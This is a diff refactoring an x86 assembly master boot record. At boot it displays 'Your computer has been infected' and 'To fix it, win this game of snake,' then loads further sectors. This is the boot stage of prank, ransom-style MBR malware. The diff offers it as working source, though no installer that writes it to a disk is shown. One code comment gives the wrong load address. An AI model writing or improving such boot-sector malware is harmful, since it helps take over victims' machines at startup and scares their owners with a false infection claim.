@@ -1,157 +1,121 @@
- ; -------- ENVIRONMENT -------- ;
-    ; defines 16-bit environment
-    [bits 16]
-    ; MBR is always loaded at offset 0x07C00
-    ; make life easier by using relative references
-    [org 0x7C00]
-
-    mov ah, 07h
-    int 10h
+; -------- ENVIRONMENT -------- ;
+[bits 16]
+[org 0x7C00]
 
 ; -------- MAIN -------- ;
 main:
-    ; disable the blinky cursor
+    ; Set up segments
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+    mov sp, 0x7C00
+
+    ; Save boot drive number
+    mov [boot_drive], dl
+
+    ; Clear the screen
+    mov ah, 0x00
+    mov al, 0x03
+    int 0x10
+
+    ; Disable the cursor
     mov ah, 0x01
     mov cx, 0x2000
     int 0x10
 
-    ; control cursor shape
-    mov dx, 0x3D4
-    mov al, 0x0A
-    out dx, al
-    inc dx
-    mov al, 0x20
-    out dx, al
-
-    ; disable the cursor
-    mov dx, 0x3D4
-    mov al, 0x0A
-    out dx, al
-    inc dx
-    mov al, 0x1F
-    out dx, al
-
-    ; initialize color display
-    mov ax, cs
-    mov ds, ax
-    mov dx, 0
-    mov bh, 0
-    mov ah, 0x2
+    ; Set background color to black and foreground color to white
+    mov ax, 0x0600
+    mov bh, 0x0F
+    xor cx, cx
+    mov dx, 0x184F
     int 0x10
 
-    ; set background color to black and foreground color to white
-    mov cx, 2000
-    mov bh, 0
-    mov bl, 0x0F
-    mov al, 0x20
-    mov ah, 0x9
-    int 0x10
-
-    ; print "Checkmate.", 10
+    ; Print first message
     mov dx, 1975 ; sets text coordinates
     mov bh, 0
     mov ah, 0x2
     int 0x10
     mov si, message
-    call printString
+    call print_string
 
-    ; print "To fix it, win this game of snake.", 10
+    ; Print second message
     mov dx, 2406 ; sets text coordinates
     mov bh, 0
     mov ah, 0x2
     int 0x10
     mov si, message2
-    call printString
+    call print_string
 
-    ; print "Press ",0x7D," to continue.", 0
+    ; Print third message
     mov dx, 3005 ; sets text coordinates
     mov bh, 0
     mov ah, 0x2
     int 0x10
     mov si, message3
-    ; Set text color to green
-    cmp si, 0x7D
-	je green
+    call print_string
 
-    call printString
+    ; Wait for 'P' key
+    call wait_for_p_key
 
-	call wait_for_p_key
+    ; Load additional sectors
+    call load_snake
 
-    jmp $
+    ; If we return here, something went wrong
+    jmp hang
 
 ; -------- FUNCTIONS -------- ;
 
-printString:
-    ; Does what the name says. Prints the text
-    pusha
-    cld
-
-nextChar:
-    mov al, [si]
-    cmp al, 0
-    je endPrintString
+print_string:
     mov ah, 0x0E
+.loop:
+    lodsb
+    test al, al
+    jz .done
     int 0x10
-    inc si
-    jmp nextChar
-
-endPrintString:
-    popa
+    jmp .loop
+.done:
     ret
 
-green:
-	mov ah, 09h
-	mov al, [si]
-	mov bl, 0x0A
-	int 0x10
-	ret
-
 wait_for_p_key:
-	mov ah, 00h
-	int 16h
-	cmp al, 'p'
-	je load_snake
-	cmp al, 'P'
-	je load_snake
-	cmp al, 'p'
-	jne wait_for_p_key
-	ret
+    mov ah, 0x00
+    int 0x16
+    or al, 0x20  ; Convert to lowercase
+    cmp al, 'p'
+    jne wait_for_p_key
+    ret
 
 load_snake:
-	mov ax, 0x07C0
-	mov ds, ax
-	mov es, ax
+    mov ah, 0x02        ; BIOS read sector function
+    mov al, 2           ; Number of sectors to read (2nd and 3rd)
+    mov ch, 0           ; Cylinder 0
+    mov cl, 2           ; Start from sector 2
+    mov dh, 0           ; Head 0
+    mov dl, [boot_drive]; Drive number
+    mov bx, 0x8000      ; Load to ES:BX = 0x0000:0x1000
 
-	mov bx, 0x1000
-	mov ah, 0x02
-	mov al, 2
-	mov ch, 0
-	mov cl, 2
-	mov dh, 0
-	mov dl, 0
+    int 0x13
+    jc read_error
 
-	int 0x13
-
-	jc read_error
-
-	jmp 0x1000:0000
+    ; Jump to the loaded code
+    jmp 0x0000:0x8000
 
 read_error:
-	jmp hang
+    mov si, error_msg
+    call print_string
+    jmp hang
 
 hang:
-	jmp hang
-
+    jmp hang
 
 ; -------- VARIABLES -------- ;
 message db "Your computer has been infected", 0
 message2 db "To fix it, win this game of snake.", 0
 message3 db "Press P to continue.", 0
+error_msg db "Error loading sectors!", 0x0D, 0x0A, 0
+boot_drive db 0
 
 ; -------- BOOT CONFIGURATION -------- ;
-    ; fill the remaining bytes of the MBR with 0s
-    times 510 - ($ - $$) db 0
-    ; add the 'magic bytes' AA and 55 to the end of MBR
-    ; this tells the BIOS this is a valid bootloader
-    dw 0xAA55
+times 510 - ($ - $$) db 0
+dw 0xAA55
 
